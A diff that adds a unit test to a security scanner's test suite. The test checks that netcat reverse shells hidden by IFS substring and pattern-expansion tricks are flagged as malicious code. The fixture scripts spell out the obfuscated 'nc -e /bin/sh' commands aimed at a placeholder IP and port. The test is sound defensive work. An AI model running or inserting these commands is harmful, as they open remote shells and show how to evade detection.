@@ -782,6 +782,31 @@ describe("scanTrustTree", () => {
     );
   });
 
+  it("flags IFS substring/pattern-expansion obfuscated reverse shells as malicious code", async () => {
+    skill("skills/clean", "# Clean\n");
+    const sub = "$" + "{IFS:0:1}";
+    const pat = "$" + "{IFS//?/}";
+    write("scripts/sub.sh", `nc${sub}-e${sub}/bin/sh 10.0.0.1 4444\n`);
+    write("scripts/pat.sh", `nc${pat}-e${pat}/bin/sh 10.0.0.1 4444\n`);
+
+    const checks = await scanTrustTree(dir);
+
+    expect(checks).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          verdict: "fail",
+          code: "trust.malicious-code",
+          location: expect.objectContaining({ uri: "scripts/sub.sh", startLine: 1 }),
+        }),
+        expect.objectContaining({
+          verdict: "fail",
+          code: "trust.malicious-code",
+          location: expect.objectContaining({ uri: "scripts/pat.sh", startLine: 1 }),
+        }),
+      ]),
+    );
+  });
+
   it("does not hard-deny conventional curl-piped installer scripts", async () => {
     skill("skills/clean", "# Clean\n");
     write(
